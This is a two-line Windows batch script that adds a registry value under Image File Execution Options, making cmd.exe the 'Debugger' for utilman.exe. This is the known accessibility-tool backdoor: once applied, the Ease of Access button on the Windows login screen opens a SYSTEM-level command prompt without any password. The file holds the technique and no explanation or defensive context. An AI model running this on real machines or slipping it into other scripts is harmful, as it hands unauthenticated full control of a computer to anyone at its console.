@echo off 


reg add "HKLM\SOFTWARE\MICROSOFT\WINDOWS NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ  /d "C:\Windows\System32\cmd.exe" 

